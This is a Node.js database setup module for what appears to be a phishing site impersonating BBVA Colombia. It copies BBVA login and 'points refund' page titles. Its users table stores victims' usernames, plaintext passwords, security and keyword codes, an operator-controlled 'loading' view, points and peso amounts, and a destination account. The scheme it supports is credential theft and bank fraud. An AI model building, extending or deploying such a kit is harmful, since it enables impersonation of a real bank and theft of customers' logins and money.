const mysql = require('mysql2/promise');

const connectionConfig = process.env.MYSQL_URL || {
  host: process.env.MYSQL_HOST || 'localhost',
  port: Number(process.env.MYSQL_PORT || 3306),
  user: process.env.MYSQL_USER,
  password: process.env.MYSQL_PASSWORD,
  database: process.env.MYSQL_DATABASE,
  ssl: process.env.MYSQL_SSL === 'true' ? {} : undefined,
  waitForConnections: true,
  connectionLimit: 10,
  queueLimit: 0,
};

const pool = mysql.createPool(connectionConfig);

async function initDb() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS users (
      id INT UNSIGNED NOT NULL AUTO_INCREMENT,
      username VARCHAR(191) NOT NULL,
      password VARCHAR(255) NOT NULL,
      apartment_code VARCHAR(6) NULL,
      keyword_code VARCHAR(255) NULL,
      current_view VARCHAR(255) NOT NULL DEFAULT 'cargando.html',
      puntos VARCHAR(50) NULL,
      valor_cop VARCHAR(50) NULL,
      cuenta_destino VARCHAR(255) NULL,
      PRIMARY KEY (id),
      UNIQUE KEY users_username_unique (username)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
  `);

  await pool.query(`
    CREATE TABLE IF NOT EXISTS seo_settings (
      page VARCHAR(20) NOT NULL,
      title VARCHAR(255) NOT NULL,
      description TEXT NULL,
      og_title VARCHAR(255) NULL,
      og_description TEXT NULL,
      canonical_url VARCHAR(500) NULL,
      updated_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
      PRIMARY KEY (page)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
  `);

  const defaultSeo = [
    [
      'login',
      'Login | BBVA Colombia',
      'Ingresa a BBVA Colombia.',
      'Login | BBVA Colombia',
      'Ingresa a BBVA Colombia.',
      ''
    ],
    [
      'index',
      'Puntos BBVA: Beneficios renovados para acompa\u00f1arte | BBVA Colombia',
      'Conoce el proceso y solicita la devoluci\u00f3n de montos en BBVA Colombia.',
      'Devoluci\u00f3n de montos',
      'Devoluci\u00f3n de montos | BBVA Colombia',
      'https://www.bbva.com.co/personas/productos/tarjetas/pago-con-puntos.html'
    ]
  ];

  for (const row of defaultSeo) {
    await pool.execute(
      `INSERT INTO seo_settings (page, title, description, og_title, og_description, canonical_url)
       VALUES (?, ?, ?, ?, ?, ?)
       ON DUPLICATE KEY UPDATE page = page`,
      row
    );
  }

  // Migraciones: agregar columnas si no existen (para bases de datos ya creadas)
  const migrations = [
    "ALTER TABLE users ADD COLUMN IF NOT EXISTS puntos VARCHAR(50) NULL",
    "ALTER TABLE users ADD COLUMN IF NOT EXISTS valor_cop VARCHAR(50) NULL",
    "ALTER TABLE users ADD COLUMN IF NOT EXISTS cuenta_destino VARCHAR(255) NULL",
  ];
  for (const sql of migrations) {
    try { await pool.query(sql); } catch (_) { /* columna ya existe */ }
  }
}

module.exports = { pool, initDb };
